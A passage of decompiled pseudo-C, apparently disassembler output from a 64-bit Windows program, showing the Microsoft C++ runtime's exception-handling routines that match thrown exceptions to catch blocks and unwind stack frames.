  unsigned int v9; // edi
  __int64 v10; // rdx
  __int64 v11; // r15
  __int64 v12; // rcx
  __int64 v13; // rax
  __int64 v14; // rcx
  const void *v15; // rdx
  __int64 v16; // rbx
  __int64 v17; // rcx
  size_t v18; // rbx
  const void *v19; // rax
  __int64 v20; // rbx
  __int64 v21; // rcx

  v8 = a3[1];
  v9 = 0;
  if ( (_DWORD)v8 != 0 )
    v10 = v8 + GetImageBase();
  else
    v10 = 0;
  if ( v10 != 0 )
  {
    v11 = a3[1];
    v12 = (_DWORD)v11 != 0 ? v11 + GetImageBase() : 0LL;
    if ( *(_BYTE *)(v12 + 16) != 0 && (a3[2] != 0 || *a3 < 0) )
    {
      if ( *a3 >= 0 )
        a2 = (__int64 *)(*a2 + a3[2]);
      if ( *(char *)a3 < 0 && (*(_BYTE *)a4 & 0x10) != 0 && qword_1400A00A0 != nullptr )
      {
        v13 = qword_1400A00A0();
        if ( v13 == 0 || a2 == nullptr )
          abort();
        *a2 = v13;
        v14 = v13;
      }
      else if ( (*(_BYTE *)a3 & 8) != 0 )
      {
        v14 = *(_QWORD *)(a1 + 40);
        if ( v14 == 0 || a2 == nullptr )
          abort();
        *a2 = v14;
      }
      else
      {
        if ( (*(_BYTE *)a4 & 1) == 0 )
        {
          v16 = *(int *)(a4 + 24);
          if ( (_DWORD)v16 != 0 )
            v17 = v16 + GetThrowImageBase();
          else
            v17 = 0;
          if ( v17 != 0 )
          {
            if ( *(_QWORD *)(a1 + 40) == 0
              || a2 == nullptr
              || ((_DWORD)(v20 = *(int *)(a4 + 24)) == 0 ? (v21 = 0) : (v21 = v20 + GetThrowImageBase()), v21 == 0) )
            {
              abort();
            }
            return (unsigned int)((*(_BYTE *)a4 & 4) != 0) + 1;
          }
          else
          {
            if ( *(_QWORD *)(a1 + 40) == 0 || a2 == nullptr )
              abort();
            v18 = *(int *)(a4 + 20);
            v19 = (const void *)sub_1400120F4(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
            memcpy(a2, v19, v18);
          }
          return v9;
        }
        v15 = *(const void **)(a1 + 40);
        if ( v15 == nullptr || a2 == nullptr )
          abort();
        memcpy(a2, v15, *(int *)(a4 + 20));
        if ( *(_DWORD *)(a4 + 20) != 8 || *a2 == 0 )
          return v9;
        v14 = *a2;
      }
      *a2 = sub_1400120F4(v14, (int *)(a4 + 8));
      return v9;
    }
  }
  return 0;
}


// ----- sub_1400129D8 @ 0x1400129d8 -----
__int64 __fastcall sub_1400129D8(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 v8; // r15
  unsigned int v9; // edi
  __int64 v10; // rdx
  __int64 v11; // r15
  __int64 v12; // rcx
  __int64 v13; // rax
  __int64 v14; // rcx
  const void *v15; // rdx
  __int64 v16; // rbx
  __int64 v17; // rcx
  size_t v18; // rbx
  const void *v19; // rax
  __int64 v20; // rbx
  __int64 v21; // rcx

  v8 = *(int *)(a3 + 8);
  v9 = 0;
  if ( (_DWORD)v8 != 0 )
    v10 = v8 + GetImageBase();
  else
    v10 = 0;
  if ( v10 != 0 )
  {
    v11 = *(int *)(a3 + 8);
    v12 = (_DWORD)v11 != 0 ? v11 + GetImageBase() : 0LL;
    if ( *(_BYTE *)(v12 + 16) != 0 && (*(_DWORD *)(a3 + 12) != 0 || *(int *)(a3 + 4) < 0) )
    {
      if ( *(int *)(a3 + 4) >= 0 )
        a2 = (__int64 *)(*a2 + *(unsigned int *)(a3 + 12));
      if ( *(char *)(a3 + 4) < 0 && (*(_BYTE *)a4 & 0x10) != 0 && qword_1400A00A0 != nullptr )
      {
        v13 = qword_1400A00A0();
        if ( v13 == 0 || a2 == nullptr )
          abort();
        *a2 = v13;
        v14 = v13;
      }
      else if ( (*(_BYTE *)(a3 + 4) & 8) != 0 )
      {
        v14 = *(_QWORD *)(a1 + 40);
        if ( v14 == 0 || a2 == nullptr )
          abort();
        *a2 = v14;
      }
      else
      {
        if ( (*(_BYTE *)a4 & 1) == 0 )
        {
          v16 = *(int *)(a4 + 24);
          if ( (_DWORD)v16 != 0 )
            v17 = v16 + GetThrowImageBase();
          else
            v17 = 0;
          if ( v17 != 0 )
          {
            if ( *(_QWORD *)(a1 + 40) == 0
              || a2 == nullptr
              || ((_DWORD)(v20 = *(int *)(a4 + 24)) == 0 ? (v21 = 0) : (v21 = v20 + GetThrowImageBase()), v21 == 0) )
            {
              abort();
            }
            return (unsigned int)((*(_BYTE *)a4 & 4) != 0) + 1;
          }
          else
          {
            if ( *(_QWORD *)(a1 + 40) == 0 || a2 == nullptr )
              abort();
            v18 = *(int *)(a4 + 20);
            v19 = (const void *)sub_1400120F4(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
            memcpy(a2, v19, v18);
          }
          return v9;
        }
        v15 = *(const void **)(a1 + 40);
        if ( v15 == nullptr || a2 == nullptr )
          abort();
        memcpy(a2, v15, *(int *)(a4 + 20));
        if ( *(_DWORD *)(a4 + 20) != 8 || *a2 == 0 )
          return v9;
        v14 = *a2;
      }
      *a2 = sub_1400120F4(v14, (int *)(a4 + 8));
      return v9;
    }
  }
  return 0;
}


// ----- sub_140012BD0 @ 0x140012bd0 -----
__int64 __fastcall sub_140012BD0(__int64 a1, __int64 *a2, int *a3, __int64 a4)
{
  __int64 v6; // rbx
  __int64 *v7; // rdi
  __int64 result; // rax
  __int64 v9; // r14
  __int64 v10; // rsi
  __int64 v11; // r14
  __int64 v12; // rsi

  v6 = 0;
  if ( *a3 >= 0 )
    v7 = (__int64 *)(*a2 + a3[2]);
  else
    v7 = a2;
  result = (unsigned int)sub_1400127E4(a1, a2, a3, a4) - 1;
  if ( (_DWORD)result != 0 )
  {
    if ( (_DWORD)result == 1 )
    {
      v9 = sub_1400120F4(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
      v10 = *(int *)(a4 + 24);
      if ( (_DWORD)v10 != 0 )
        v6 = GetThrowImageBase() + v10;
      return unknown_libname_51(v7, v6, v9, 1);
    }
  }
  else
  {
    v11 = sub_1400120F4(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
    v12 = *(int *)(a4 + 24);
    if ( (_DWORD)v12 != 0 )
      v6 = GetThrowImageBase() + v12;
    return unknown_libname_50(v7, v6, v11);
  }
  return result;
}


// ----- sub_140012C90 @ 0x140012c90 -----
__int64 __fastcall sub_140012C90(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rbx
  __int64 *v7; // rdi
  __int64 result; // rax
  __int64 v9; // r14
  __int64 v10; // rsi
  __int64 v11; // r14
  __int64 v12; // rsi

  v6 = 0;
  if ( *(int *)(a3 + 4) >= 0 )
    v7 = (__int64 *)(*a2 + *(unsigned int *)(a3 + 12));
  else
    v7 = a2;
  result = (unsigned int)sub_1400129D8(a1, a2, a3, a4) - 1;
  if ( (_DWORD)result != 0 )
  {
    if ( (_DWORD)result == 1 )
    {
      v9 = sub_1400120F4(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
      v10 = *(int *)(a4 + 24);
      if ( (_DWORD)v10 != 0 )
        v6 = GetThrowImageBase() + v10;
      return unknown_libname_51(v7, v6, v9, 1);
    }
  }
  else
  {
    v11 = sub_1400120F4(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
    v12 = *(int *)(a4 + 24);
    if ( (_DWORD)v12 != 0 )
      v6 = GetThrowImageBase() + v12;
    return unknown_libname_50(v7, v6, v11);
  }
  return result;
}


// ----- sub_140012D54 @ 0x140012d54 -----
void __fastcall sub_140012D54(
        struct EHExceptionRecord *a1,
        void **a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct _s_FuncInfo *a5,
        struct _s_HandlerType *a6,
        __int64 a7,
        int *a8,
        int a9,
        int a10,
        int a11,
        char a12)
{
  __int64 *v15; // rax
  unsigned __int64 *v16; // r15
  struct _s_HandlerType *v17; // rbp
  __int64 dispOfHandler; // rbx
  int v19; // edi
  int v20; // esi
  __int64 ImageBase; // rax
  __int64 v22; // [rsp+A8h] [rbp+10h] BYREF
  struct _CONTEXT *v23; // [rsp+B0h] [rbp+18h]

  v23 = a3;
  v15 = sub_140011614(a2, (ULONG64 *)a4, (__int64)a5, &v22);
  v16 = (unsigned __int64 *)v15;
  v17 = a6;
  if ( a7 != 0 )
    sub_140012BD0((__int64)a1, v15, (int *)a6, a7);
  dispOfHandler = v17->dispOfHandler;
  v19 = a8[2];
  v20 = *a8;
  ImageBase = GetImageBase();
  __FrameHandler3::UnwindNestedFrames(a2, a1, v23, v16, (void *)(dispOfHandler + ImageBase), a5, v20, v19, v17, a4, a12);
}


// ----- sub_140012E2C @ 0x140012e2c -----
void __fastcall sub_140012E2C(
        struct EHExceptionRecord *a1,
        unsigned __int64 *a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct FH4::FuncInfo4 *a5,
        struct FH4::HandlerType4 *a6,
        __int64 a7,
        int *a8,
        int a9,
        int a10,
        int a11,
        char a12)
{
  __int64 *EstablisherFrame; // rax
  unsigned __int64 *v16; // r15
  struct FH4::HandlerType4 *v17; // rbp
  __int64 v18; // rbx
  int v19; // edi
  int v20; // esi
  __int64 ImageBase; // rax
  unsigned __int64 v22; // [rsp+A8h] [rbp+10h] BYREF
  struct _CONTEXT *v23; // [rsp+B0h] [rbp+18h]

  v23 = a3;
  EstablisherFrame = (__int64 *)__FrameHandler4::GetEstablisherFrame(a2, a4, a5, &v22);
  v16 = (unsigned __int64 *)EstablisherFrame;
  v17 = a6;
  if ( a7 != 0 )
    sub_140012C90((__int64)a1, EstablisherFrame, (__int64)a6, a7);
  v18 = *((int *)v17 + 4);
  v19 = a8[2];
  v20 = *a8;
  ImageBase = GetImageBase();
  __FrameHandler4::UnwindNestedFrames((void **)a2, a1, v23, v16, (void *)(v18 + ImageBase), a5, v20, v19, v17, a4, a12);
}


// ----- sub_140012F04 @ 0x140012f04 -----
__int64 __fastcall sub_140012F04(
        struct EHExceptionRecord *a1,
        unsigned __int64 *a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct _s_FuncInfo *a5,
        char a6,
        int a7,
        __int64 a8)
{
  unsigned __int64 *v8; // r12
  int v9; // ebx
  __ehstate_t HandlerSearchState; // eax
  int v14; // r15d
  __int64 result; // rax
  __int64 v16; // rbx
  unsigned int v17; // r12d
  _QWORD *v18; // r9
  __int64 v19; // rax
  __int64 v20; // r8
  __m128i v21; // xmm0
  __int64 v22; // rcx
  unsigned __int64 v23; // xmm0_8
  __int64 v24; // rdx
  __int64 v25; // rax
  __int64 pCatchableTypeArray; // rbx
  __int64 v27; // rbx
  int *v28; // rcx
  __int64 v29; // rbx
  __int64 v30; // rbx
  __int64 v31; // rbx
  __int64 dispESTypeList; // rbx
  __int64 v33; // rdx
  unsigned __int64 *v34; // rax
  int v35; // [rsp+50h] [rbp-B0h]
  char v36; // [rsp+60h] [rbp-A0h]
  int v37; // [rsp+64h] [rbp-9Ch]
  int v38; // [rsp+68h] [rbp-98h]
  int *v39; // [rsp+70h] [rbp-90h]
  __int64 v41; // [rsp+88h] [rbp-78h] BYREF
  __int128 v42; // [rsp+90h] [rbp-70h]
  unsigned __int64 v43; // [rsp+A0h] [rbp-60h]
  __int64 v44[2]; // [rsp+A8h] [rbp-58h] BYREF
  int v45; // [rsp+B8h] [rbp-48h]
  _QWORD v46[2]; // [rsp+C0h] [rbp-40h] BYREF
  __int128 v47; // [rsp+D0h] [rbp-30h] BYREF
  unsigned int v48; // [rsp+E8h] [rbp-18h]
  struct _s_HandlerType v49; // [rsp+F0h] [rbp-10h] BYREF

  v8 = a2;
  v9 = a8;
  HandlerSearchState = __FrameHandler3::GetHandlerSearchState(a2, a4, a5);
  v14 = HandlerSearchState;
  if ( HandlerSearchState < -1 || HandlerSearchState >= a5->maxState )
    goto LABEL_55;
  v36 = 0;
  if ( a1->ExceptionCode == -529697949
    && a1->NumberParameters == 4
    && a1->params.magicNumber - 429065504 <= 2
    && a1->params.pThrowInfo == nullptr )
  {
    result = sub_14001244C();
    if ( *(_QWORD *)(result + 32) == 0 )
      return result;
    a1 = *(struct EHExceptionRecord **)(sub_14001244C() + 32);
    a3 = *(struct _CONTEXT **)(sub_14001244C() + 40);
    SetThrowImageBase((__int64)a1->params.pThrowImageBase);
    if ( a1 == nullptr
      || a1->ExceptionCode == -529697949
      && a1->NumberParameters == 4
      && a1->params.magicNumber - 429065504 <= 2
      && a1->params.pThrowInfo == nullptr )
    {
      goto LABEL_55;
    }
    v36 = 1;
    if ( *(_QWORD *)(sub_14001244C() + 56) != 0 )
    {
      v16 = *(_QWORD *)(sub_14001244C() + 56);
      *(_QWORD *)(sub_14001244C() + 56) = 0;
      if ( (unsigned __int8)sub_140015374(a1, v16) == 0 )
      {
        if ( (unsigned __int8)sub_140015454(v16) != 0 )
        {
          _DestructExceptionObject((__int64)a1);
          sub_14001475C(v44);
          sub_140011278(v44, &_TI2_AVbad_exception_std__);
          __debugbreak();
        }
        sub_14001BA28();
      }
      v9 = a8;
    }
  }
  v46[1] = a4->ImageBase;
  v46[0] = a5;
  if ( a1->ExceptionCode == -529697949 && a1->NumberParameters == 4 && a1->params.magicNumber - 429065504 <= 2 )
  {
    if ( a5->nTryBlocks != 0 )
    {
      sub_140011718((__int64)&v47, (__int64)v46, v14, (__int64)a4, (__int64)a5);
      v42 = v47;
      if ( DWORD2(v47) < v48 )
      {
        v17 = DWORD2(v42);
        v18 = (_QWORD *)v42;
        do
        {
          v19 = v18[1];
          v20 = *(int *)(*v18 + 16LL) + 20LL * v17;
          v21 = *(__m128i *)(v20 + v19);
          v22 = *(int *)(v20 + v19 + 16);
          v45 = *(_DWORD *)(v20 + v19 + 16);
          *(__m128i *)v44 = v21;
          if ( _mm_cvtsi128_si32(v21) <= v14 && v14 <= v21.m128i_i32[1] )
          {
            v23 = _mm_srli_si128(v21, 8).m128i_u64[0];
            v24 = a4->ImageBase + v22;
            v25 = 0;
            v41 = v24;
            v38 = 0;
            v43 = HIDWORD(v23);
            if ( HIDWORD(v23) != 0 )
            {
              while ( 1 )
              {
                v49 = *(struct _s_HandlerType *)(v24 + 20 * v25);
                pCatchableTypeArray = a1->params.pThrowInfo->pCatchableTypeArray;
                v39 = (int *)(pCatchableTypeArray + GetThrowImageBase() + 4);
                v27 = a1->params.pThrowInfo->pCatchableTypeArray;
                v37 = *(_DWORD *)(GetThrowImageBase() + v27);
                if ( v37 > 0 )
                  break;
LABEL_31:
                v25 = (unsigned int)(v38 + 1);
                v38 = v25;
                if ( (_DWORD)v25 == (_DWORD)v43 )
                  goto LABEL_34;
                v24 = v41;
              }
              v28 = v39;
              while ( 1 )
              {
                v29 = *v28;
                v30 = GetThrowImageBase() + v29;
                if ( (unsigned int)sub_140013E34(&v49, v30, a1->params.pThrowInfo) != 0 )
                  break;
                v28 = v39 + 1;
                --v37;
                ++v39;
                if ( v37 <= 0 )
                  goto LABEL_31;
              }
              LOBYTE(v35) = v36;
              sub_140012D54(a1, (void **)a2, a3, a4, a5, &v49, v30, (int *)v44, a7, a8, v35, a6);
LABEL_34:
              v18 = (_QWORD *)v42;
            }
          }
          ++v17;
        }
        while ( v17 < v48 );
        v8 = a2;
      }
    }
    if ( (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930521
      && ((_DWORD)(v31 = a5->dispESTypeList) != 0 && v31 + GetImageBase() != 0
       || (a5->EHFlags & 4) != 0 && !__FrameHandler3::ExecutionInCatch(a4, a5)) )
    {
      if ( (a5->EHFlags & 4) != 0 )
      {
        *(_QWORD *)(sub_14001244C() + 32) = a1;
        *(_QWORD *)(sub_14001244C() + 40) = a3;
        sub_14001BA28();
      }
      dispESTypeList = a5->dispESTypeList;
      if ( (_DWORD)dispESTypeList != 0 )
        v33 = dispESTypeList + GetImageBase();
      else
        v33 = 0;
      if ( (unsigned __int8)sub_140015374(a1, v33) == 0 )
      {
        v34 = sub_140011614(v8, (ULONG64 *)a4, (__int64)a5, &v41);
        __FrameHandler3::UnwindNestedFrames((void **)v8, a1, a3, v34, nullptr, a5, -1, -1, nullptr, a4, a6);
      }
    }
  }
  else if ( a5->nTryBlocks != 0 )
  {
    if ( a6 != 0 )
      goto LABEL_55;
    sub_1400138E4(a1, a5, v14, a7, v9);
  }
  result = sub_14001244C();
  if ( *(_QWORD *)(result + 56) != 0 )
LABEL_55:
    abort();
  return result;
}


// ----- sub_1400133C4 @ 0x1400133c4 -----
__int64 __fastcall sub_1400133C4(
        struct EHExceptionRecord *a1,
        unsigned __int64 *a2,
        struct _CONTEXT *a3,
        __int64 a4,
        struct FH4::FuncInfo4 *a5,
        char a6,
        int a7,
        __int64 a8)
{
  int v11; // esi
  _BYTE *v12; // rdx
  int v13; // eax
  __int64 result; // rax
  __int64 v15; // rbx
  __int64 v16; // rdx
  __int64 v17; // rcx
  unsigned int v18; // r12d
  __int64 v19; // rbx
  ThrowInfo *pThrowInfo; // rax
  __int64 pCatchableTypeArray; // rbx
  __int64 v22; // rbx
  int v23; // r12d
  int *v24; // rax
  __int64 v25; // rbx
  __int64 v26; // rbx
  _BYTE *v27; // r10
  __int64 v28; // rcx
  __int64 v29; // r9
  unsigned int v30; // eax
  __int64 v31; // rcx
  __int64 v32; // r8
  _BYTE *v33; // rdx
  __int64 v34; // rcx
  _DWORD *v35; // r10
  __int64 v36; // rdx
  __int64 v37; // rcx
  int v38; // [rsp+50h] [rbp-B0h]
  char v39; // [rsp+60h] [rbp-A0h]
  int v40; // [rsp+64h] [rbp-9Ch]
  int v41; // [rsp+68h] [rbp-98h]
  int v42; // [rsp+6Ch] [rbp-94h]
  int *v43; // [rsp+70h] [rbp-90h]
  __int64 v45; // [rsp+80h] [rbp-80h]
  __int64 v46[2]; // [rsp+98h] [rbp-68h] BYREF
  _QWORD v47[3]; // [rsp+B0h] [rbp-50h] BYREF
  unsigned int v48; // [rsp+C8h] [rbp-38h]
  _QWORD v49[5]; // [rsp+D0h] [rbp-30h] BYREF
  int v50[10]; // [rsp+F8h] [rbp-8h] BYREF
  _QWORD v51[10]; // [rsp+120h] [rbp+20h] BYREF

  v11 = sub_140012690((__int64)a5, (_QWORD *)a4);
  if ( *(_DWORD *)(a4 + 72) != 0 )
  {
    if ( *(_DWORD *)(sub_14001244C() + 120) != -2 )
      goto LABEL_53;
    v11 = *(_DWORD *)(a4 + 72) - 2;
  }
  else if ( *(_DWORD *)(sub_14001244C() + 120) != -2 )
  {
    v11 = *(_DWORD *)(sub_14001244C() + 120);
    *(_DWORD *)(sub_14001244C() + 120) = -2;
  }
  if ( v11 < -1 )
    goto LABEL_53;
  if ( *((_DWORD *)a5 + 2) != 0 )
  {
    v12 = (_BYTE *)(*((int *)a5 + 2) + *(_QWORD *)(a4 + 8));
    v13 = *(_DWORD *)&v12[-byte_14008FFB0[*v12 & 0xF] - 4] >> byte_14008FFB0[(*v12 & 0xF) + 16];
  }
  else
  {
    v13 = 0;
  }
  if ( v11 >= v13 )
    goto LABEL_53;
  v39 = 0;
  if ( a1->ExceptionCode == -529697949
    && a1->NumberParameters == 4
    && a1->params.magicNumber - 429065504 <= 2
    && a1->params.pThrowInfo == nullptr )
  {
    result = sub_14001244C();
    if ( *(_QWORD *)(result + 32) == 0 )
      return result;
    a1 = *(struct EHExceptionRecord **)(sub_14001244C() + 32);
    a3 = *(struct _CONTEXT **)(sub_14001244C() + 40);
    SetThrowImageBase((__int64)a1->params.pThrowImageBase);
    if ( a1 == nullptr
      || a1->ExceptionCode == -529697949
      && a1->NumberParameters == 4
      && a1->params.magicNumber - 429065504 <= 2
      && a1->params.pThrowInfo == nullptr )
    {
      goto LABEL_53;
    }
    v39 = 1;
    if ( *(_QWORD *)(sub_14001244C() + 56) != 0 )
    {
      v15 = *(_QWORD *)(sub_14001244C() + 56);
      *(_QWORD *)(sub_14001244C() + 56) = 0;
      if ( (unsigned __int8)sub_140015374(a1, v15) == 0 )
      {
        if ( (unsigned __int8)sub_140015454(v15) != 0 )
        {
          _DestructExceptionObject((__int64)a1);
          sub_14001475C(v46);
          sub_140011278(v46, &_TI2_AVbad_exception_std__);
          __debugbreak();
        }
        sub_14001BA28(v17, v16);
      }
    }
  }
  FH4::TryBlockMap4::TryBlockMap4((FH4::TryBlockMap4 *)v50, a5, *(_QWORD *)(a4 + 8));
  if ( a1->ExceptionCode == -529697949 && a1->NumberParameters == 4 && a1->params.magicNumber - 429065504 <= 2 )
  {
    if ( v50[0] != 0 )
    {
      sub_140011854((__int64)v47, v50, v11);
      v45 = v47[0];
      if ( LODWORD(v47[1]) < v48 )
      {
        v18 = v47[1];
        v19 = v47[0];
        v40 = v47[1];
        do
        {
          *(_OWORD *)v46 = *(_OWORD *)(v19 + 24);
          if ( SLODWORD(v46[0]) <= v11 && v11 <= SHIDWORD(v46[0]) )
          {
            FH4::HandlerMap4::HandlerMap4(
              (FH4::HandlerMap4 *)v51,
              (const struct FH4::TryBlockMapEntry4 *)v46,
              *(_QWORD *)(a4 + 8),
              **(_DWORD **)(a4 + 16));
            v41 = 0;
            v42 = v51[0];
            if ( LODWORD(v51[0]) != 0 )
            {
              while ( 1 )
              {
                pThrowInfo = a1->params.pThrowInfo;
                qmemcpy(v49, &v51[3], sizeof(v49));
                pCatchableTypeArray = pThrowInfo->pCatchableTypeArray;
                v43 = (int *)(pCatchableTypeArray + GetThrowImageBase() + 4);
                v22 = a1->params.pThrowInfo->pCatchableTypeArray;
                v23 = *(_DWORD *)(GetThrowImageBase() + v22);
                if ( v23 > 0 )
                  break;
LABEL_38:
                FH4::HandlerMap4::DecompHandler((FH4::HandlerMap4 *)v51);
                if ( ++v41 == v42 )
                  goto LABEL_41;
              }
              v24 = v43;
              while ( 1 )
              {
                v25 = *v24;
                v26 = GetThrowImageBase() + v25;
                if ( (unsigned int)sub_140013F64(v49, v26, a1->params.pThrowInfo) != 0 )
                  break;
                --v23;
                v24 = ++v43;
                if ( v23 <= 0 )
                  goto LABEL_38;
              }
              LOBYTE(v38) = v39;
              sub_140012E2C(
                a1,
                a2,
                a3,
                (struct _xDISPATCHER_CONTEXT *)a4,
                a5,
                (struct FH4::HandlerType4 *)v49,
                v26,
                (int *)v46,
                a7,
                a8,
                v38,
                a6);
LABEL_41:
              v18 = v40;
              v19 = v45;
            }
          }
          v27 = *(_BYTE **)(v19 + 8);
          v40 = ++v18;
          v28 = *v27 & 0xF;
          v29 = byte_14008FFB0[v28];
          LOBYTE(v28) = byte_14008FFB0[v28 + 16];
          v30 = *(_DWORD *)&v27[-v29 - 4];
          *(_QWORD *)(v19 + 8) = &v27[-v29];
          *(_DWORD *)(v19 + 24) = v30 >> v28;
          v31 = v27[-v29] & 0xF;
          v32 = byte_14008FFB0[v31];
          v33 = &v27[-v32 - v29];
          *(_DWORD *)(v19 + 28) = *((_DWORD *)v33 - 1) >> byte_14008FFB0[v31 + 16];
          *(_QWORD *)(v19 + 8) = v33;
          v34 = *v33 & 0xF;
          v35 = &v27[-byte_14008FFB0[v34] - v32 - v29];
          *(_DWORD *)(v19 + 32) = *(v35 - 1) >> byte_14008FFB0[v34 + 16];
          *(_QWORD *)(v19 + 8) = v35;
          LODWORD(v34) = *v35;
          *(_QWORD *)(v19 + 8) = v35 + 1;
          *(_DWORD *)(v19 + 36) = v34;
        }
        while ( v18 < v48 );
      }
    }
    if ( (*(_BYTE *)a5 & 0x40) != 0 && !__FrameHandler4::ExecutionInCatch((struct _xDISPATCHER_CONTEXT *)a4, a5) )
    {
      *(_QWORD *)(sub_14001244C() + 32) = a1;
      *(_QWORD *)(sub_14001244C() + 40) = a3;
      sub_14001BA28(v37, v36);
    }
  }
  else if ( v50[0] != 0 )
  {
    if ( a6 != 0 )
      goto LABEL_53;
    sub_140013B2C(a1, a5, v11, a7, a8);
  }
  result = sub_14001244C();
  if ( *(_QWORD *)(result + 56) != 0 )
LABEL_53:
    abort();
  return result;
}


// ----- sub_1400138E4 @ 0x1400138e4 -----
void __fastcall sub_1400138E4(
        struct EHExceptionRecord *a1,
        void **a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct _s_FuncInfo *a5,
        int a6,
        int a7,
        int a8)
{
  __int64 v12; // rbx
  unsigned int v13; // ebx
  __int64 v14; // rax
  __int64 v15; // r8
  __m128i v16; // xmm0
  __int64 v17; // rdx
  struct _s_HandlerType *v18; // r14
  __int64 dispType; // r15
  __int64 v20; // r15
  __int64 v21; // rax
  int v22; // [rsp+50h] [rbp-A8h]
  _QWORD v23[2]; // [rsp+60h] [rbp-98h] BYREF
  __int128 v24; // [rsp+70h] [rbp-88h]
  __int64 v25[2]; // [rsp+80h] [rbp-78h] BYREF
  int v26; // [rsp+90h] [rbp-68h]
  __int128 v27; // [rsp+98h] [rbp-60h] BYREF
  unsigned int v28; // [rsp+B0h] [rbp-48h]

  if ( a1->ExceptionCode != -2147483645
    && (*(_QWORD *)(sub_14001244C() + 16) == 0
     || (PVOID)(v12 = *(_QWORD *)(sub_14001244C() + 16)) == EncodePointer(nullptr)
     || a1->ExceptionCode == -532459699
     || a1->ExceptionCode == -532462766
     || (unsigned int)sub_140011320(&a1->ExceptionCode, (__int64)a2, (__int64)a3) == 0) )
  {
    v23[1] = a4->ImageBase;
    v23[0] = a5;
    if ( a5->nTryBlocks == 0 )
      abort();
    sub_140011718((__int64)&v27, (__int64)v23, a6, (__int64)a4, (__int64)a5);
    v24 = v27;
    if ( DWORD2(v27) < v28 )
    {
      v13 = DWORD2(v24);
      do
      {
        v14 = *(_QWORD *)(v24 + 8);
        v15 = *(int *)(*(_QWORD *)v24 + 16LL) + 20LL * v13;
        v16 = *(__m128i *)(v15 + v14);
        v17 = *(int *)(v15 + v14 + 16);
        v26 = *(_DWORD *)(v15 + v14 + 16);
        *(__m128i *)v25 = v16;
        if ( _mm_cvtsi128_si32(v16) <= a6 && a6 <= v16.m128i_i32[1] )
        {
          if ( (v18 = (struct _s_HandlerType *)(v17
                                              + 20 * HIDWORD(_mm_srli_si128(v16, 8).m128i_u64[0])
                                              + a4->ImageBase
                                              - 20),
                (_DWORD)(dispType = v18->dispType) == 0)
            || dispType + GetImageBase() == 0
            || ((_DWORD)(v20 = v18->dispType) == 0 ? (v21 = 0) : (v21 = v20 + GetImageBase()), *(_BYTE *)(v21 + 16) == 0) )
          {
            if ( (v18->adjectives & 0x40) == 0 )
            {
              LOBYTE(v22) = 1;
              sub_140012D54(a1, a2, a3, a4, a5, v18, 0, (int *)v25, a7, a8, v22, 0);
            }
          }
        }
        ++v13;
      }
      while ( v13 < v28 );
    }
  }
}


// ----- sub_140013B2C @ 0x140013b2c -----
__int64 __fastcall sub_140013B2C(
        struct EHExceptionRecord *a1,
        unsigned __int64 *a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct FH4::FuncInfo4 *a5,
        int a6,
        int a7,
        __int64 a8)
{
  __int64 result; // rax
  __int64 v12; // rbx
  __int64 v13; // r11
  int v14; // r13d
  unsigned int v15; // ebx
  unsigned int v16; // r13d
  __int64 v17; // rbx
  __int64 v18; // rbx
  __int64 v19; // rax
  _BYTE *v20; // r10
  __int64 v21; // rcx
  __int64 v22; // r9
  int v23; // eax
  __int64 v24; // rcx
  __int64 v25; // r8
  _BYTE *v26; // rdx
  __int64 v27; // rcx
  _DWORD *v28; // r10
  int v29; // [rsp+50h] [rbp-B0h]
  unsigned int v30; // [rsp+60h] [rbp-A0h]
  __int64 v32; // [rsp+78h] [rbp-88h]
  __int64 v34[2]; // [rsp+90h] [rbp-70h] BYREF
  _QWORD v35[3]; // [rsp+A0h] [rbp-60h] BYREF
  unsigned int v36; // [rsp+B8h] [rbp-48h]
  int v37; // [rsp+C0h] [rbp-40h] BYREF
  __int64 v38; // [rsp+C8h] [rbp-38h]
  __int64 v39; // [rsp+D0h] [rbp-30h]
  _BYTE v40[8]; // [rsp+D8h] [rbp-28h] BYREF
  int v41; // [rsp+E0h] [rbp-20h]
  int v42[10]; // [rsp+110h] [rbp+10h] BYREF

  result = a8;
  if ( a1->ExceptionCode != -2147483645
    && (*(_QWORD *)(sub_14001244C() + 16) == 0
     || (PVOID)(v12 = *(_QWORD *)(sub_14001244C() + 16)) == EncodePointer(nullptr)
     || a1->ExceptionCode == -532459699
     || a1->ExceptionCode == -532462766
     || (_DWORD)(result = sub_140011374(&a1->ExceptionCode, (__int64)a2, (__int64)a3)) == 0) )
  {
    FH4::TryBlockMap4::TryBlockMap4((FH4::TryBlockMap4 *)v42, a5, a4->ImageBase);
    if ( v42[0] == 0 )
      abort();
    sub_140011854((__int64)v35, v42, a6);
    v32 = v35[0];
    result = LODWORD(v35[1]);
    if ( LODWORD(v35[1]) < v36 )
    {
      v13 = v35[0];
      v30 = v35[1];
      do
      {
        *(_OWORD *)v34 = *(_OWORD *)(v13 + 24);
        if ( SLODWORD(v34[0]) <= a6 && a6 <= SHIDWORD(v34[0]) )
        {
          FH4::HandlerMap4::HandlerMap4(
            (FH4::HandlerMap4 *)&v37,
            (const struct FH4::TryBlockMapEntry4 *)v34,
            a4->ImageBase,
            a4->FunctionEntry->BeginAddress);
          v38 = v39;
          FH4::HandlerMap4::DecompHandler((FH4::HandlerMap4 *)&v37);
          v14 = v37;
          v38 = v39;
          FH4::HandlerMap4::DecompHandler((FH4::HandlerMap4 *)&v37);
          v15 = 0;
          v16 = v14 - 1;
          if ( v16 != 0 )
          {
            do
            {
              FH4::HandlerMap4::DecompHandler((FH4::HandlerMap4 *)&v37);
              ++v15;
            }
            while ( v15 < v16 );
          }
          v17 = v41;
          if ( v41 == 0
            || v17 + GetImageBase() == 0
